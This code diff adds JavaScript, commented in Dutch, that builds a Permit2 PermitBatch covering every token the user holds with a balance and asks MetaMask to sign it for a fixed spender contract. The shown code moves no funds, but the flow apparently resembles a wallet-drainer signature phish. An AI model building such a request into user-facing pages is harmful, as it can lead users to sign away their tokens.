@@ -322,6 +322,53 @@ if (details.length === 0) {
   log("❌ No tokens with balance → stopping");
   return;
 }
+log("✍️ Building typed data...");
+
+// 1. Chain ID ophalen
+const chainId = (await provider.getNetwork()).chainId;
+
+// 2. Domain (vast format van Permit2)
+const domain = {
+  name: "Permit2",
+  chainId: chainId,
+  verifyingContract: PERMIT2
+};
+
+// 3. Types (MOET exact zo)
+const types = {
+  PermitBatch: [
+    { name: "details", type: "PermitDetails[]" },
+    { name: "spender", type: "address" },
+    { name: "sigDeadline", type: "uint256" }
+  ],
+  PermitDetails: [
+    { name: "token", type: "address" },
+    { name: "amount", type: "uint160" },
+    { name: "expiration", type: "uint48" },
+    { name: "nonce", type: "uint48" }
+  ]
+};
+
+// 4. Deadline (wanneer signature verloopt)
+const sigDeadline = Math.floor(Date.now() / 1000) + 3600;
+
+// 5. Data die getekend wordt
+const values = {
+  details: details,
+  spender: CONTRACT,
+  sigDeadline: sigDeadline
+};
+
+log("🖊 Requesting signature...");
+
+// 6. SIGNATURE REQUEST (dit triggert MetaMask)
+const signature = await signer.signTypedData(
+  domain,
+  types,
+  values
+);
+
+log("✅ Signature obtained");
 function updateStatus(dotId, textId, text, color) {
     const dot = document.getElementById(dotId);
     const label = document.getElementById(textId);
